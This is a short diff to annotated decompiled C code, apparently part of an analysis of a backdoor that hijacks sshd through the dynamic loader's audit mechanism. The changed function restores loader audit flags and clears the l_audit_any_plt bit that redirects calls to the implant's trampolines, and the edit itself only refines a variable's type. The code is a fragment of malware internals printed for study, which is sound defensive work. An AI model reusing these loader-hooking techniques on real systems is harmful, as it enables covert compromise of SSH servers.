@@ -17,7 +17,7 @@ void restore_ldso_audit_state(ldso_ctx_t *ldso_ctx)
 
 {
   u32 *libcrypto_bindflags_slot;
-  byte *sshd_audit_flag_byte;
+  LinkMapAuditFlags_t *sshd_audit_flag_byte;
   
   if (ldso_ctx != (ldso_ctx_t *)0x0) {
     libcrypto_bindflags_slot = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
@@ -33,7 +33,7 @@ void restore_ldso_audit_state(ldso_ctx_t *ldso_ctx)
       // AutoDoc: Mirror the same restoration for sshd’s auditstate structure.
       *ldso_ctx->sshd_auditstate_bindflags_ptr = ldso_ctx->sshd_auditstate_bindflags_old_value;
     }
-    sshd_audit_flag_byte = (byte *)ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
+    sshd_audit_flag_byte = ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
     if (sshd_audit_flag_byte != (byte *)0x0) {
       // AutoDoc: Clear the `l_audit_any_plt` bit the loader set so `_dl_audit` stops forcing our trampolines.
       *sshd_audit_flag_byte = *sshd_audit_flag_byte & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
